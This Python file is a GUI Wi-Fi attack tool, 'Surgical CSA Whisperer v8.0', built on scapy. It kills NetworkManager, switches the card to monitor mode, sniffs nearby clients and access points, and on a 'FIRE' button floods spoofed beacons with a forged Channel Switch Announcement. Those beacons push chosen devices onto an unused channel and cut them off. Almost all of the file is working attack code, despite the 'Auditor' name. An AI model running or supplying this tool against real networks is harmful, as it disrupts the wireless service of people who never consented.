import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class CSABypassAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        
        self.lock_hardware()
        self.build_gui()

    def lock_hardware(self):
        # Stop 'the fucker' (NetworkManager)
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("Surgical CSA Whisperer v8.0")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")

        # Search bar for surgical targeting
        search_frame = tk.Frame(self.root, bg="#050505")
        search_frame.pack(pady=10, fill="x", padx=20)
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.update_ui())
        tk.Entry(search_frame, textvariable=self.search_var, bg="#111", fg="#00FF41").pack(side="left", fill="x", expand=True)

        # Treeview to display AC/N targets
        self.tree = ttk.Treeview(self.root, columns=("MAC", "SSID", "BSSID", "CH"), show="headings")
        for col in ("MAC", "SSID", "BSSID", "CH"): self.tree.heading(col, text=col)
        self.tree.pack(padx=20, pady=10, fill="both", expand=True)

        # Attack Button
        self.btn_text = tk.StringVar(value="FIRE CSA WHISPER")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_attack, bg="#aa0000", fg="white", height=2).pack(pady=10)
        
        # Status
        self.status_var = tk.StringVar(value="Status: Monitoring 2.4/5GHz...")
        tk.Label(self.root, textvariable=self.status_var, fg="#888", bg="#050505").pack()

        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def toggle_attack(self):
        if not self.firing:
            sel = self.tree.selection()
            if not sel: return
            self.firing = True
            self.btn_text.set("WHISPERING (CSA ACTIVE)")
            targets = [self.tree.item(i)["values"] for i in sel]
            threading.Thread(target=self.csa_loop, args=(targets,), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("FIRE CSA WHISPER")

    def csa_loop(self, targets):
        """
        The Logic: Spoof a Beacon with a Channel Switch Announcement.
        IE 37: CSA (Channel Switch Announcement)
        """
        while self.firing:
            for mac, ssid, bssid, ch in targets:
                if not self.firing: break
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                
                # Construct Rogue Beacon
                # We tell the client to switch to Channel 165 (an uncommon 5GHz channel)
                # IE 37 Params: [Mode (1), New Channel (165), Switch Count (1)]
                csa_ie = b"\x25\x03\x01\xa5\x01" 
                
                pkt = (RadioTap() / 
                       Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / 
                       Dot11Beacon(cap="ESS+privacy") / 
                       Dot11Elt(ID="SSID", info=ssid) / 
                       Raw(load=csa_ie))
                
                try:
                    # Fire a burst of "advice"
                    sendp(pkt, iface=self.iface, count=10, inter=0.05, verbose=False)
                except: break
            time.sleep(0.1)

    # ... [Search/Update/Hopper logic remains from previous version] ...
    def update_ui(self):
        search_term = self.search_var.get().lower()
        for i in self.tree.get_children(): self.tree.delete(i)
        for mac, info in self.discovered.items():
            if search_term in mac.lower() or search_term in info["SSID"].lower():
                self.tree.insert("", "end", values=(mac, info["SSID"], info["BSSID"], info["CH"]))

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8: # Beacon
                    ssid = pkt.info.decode(errors="ignore") or "Hidden"
                    bssid = pkt.addr3
                    for mac, data in self.discovered.items():
                        if data["BSSID"] == bssid: data["SSID"] = ssid
                if pkt.addr2 and pkt.addr3 and pkt.addr2 != pkt.addr3:
                    mac, bssid = pkt.addr2, pkt.addr3
                    if mac not in self.discovered and ":" in mac:
                        self.discovered[mac] = {"BSSID": bssid, "SSID": "Scanning...", "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def hopper(self):
        # Hopper logic now covers common PH channels including 5GHz (if card is AC)
        channels = [1, 6, 11, 36, 44, 149, 157]
        i = 0
        while self.running:
            if not self.firing:
                ch = channels[i]
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                i = (i + 1) % len(channels)
                time.sleep(1)
            else: time.sleep(1)

    def shutdown(self):
        self.running = False; self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    CSABypassAuditor(sys.argv[1]).root.mainloop()
